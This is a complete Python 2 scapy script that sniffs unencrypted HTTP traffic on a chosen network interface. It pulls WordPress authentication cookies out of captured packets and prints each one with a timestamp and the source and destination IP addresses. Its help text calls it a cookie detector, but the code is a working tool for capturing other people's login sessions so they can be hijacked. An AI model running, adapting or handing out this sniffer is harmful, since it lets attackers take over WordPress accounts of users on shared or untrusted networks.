#!/usr/bin/env python2
import re, argparse, sys, datetime
from scapy.all import *

def scrape(pkt):
    raw = pkt.sprintf("%Raw.load%")
    found = re.findall('wordpress_[0-9a-fA-F]{32}', raw)
    if found and 'set' not in raw.lower():
        print("[%s] %s > %s : Cookie : %s" % (datetime.now(), pkt.getlayer(IP).src, pkt.getlayer(IP).dst, found[0]))


def getargs():
    ap = argparse.ArgumentParser(description="Detect Wordpress cookies")
    ap.add_argument('-i', '--iface', type=str, default=None, help="Interface to packet capture on")
    args, l = ap.parse_known_args()
    if args.iface == None:
        ap.print_help()
        sys.exit()
    else:
        return args

def main():
    args = getargs()
    sniff(filter='tcp port 80', iface=args.iface, prn=scrape)



if __name__=="__main__":
    main()
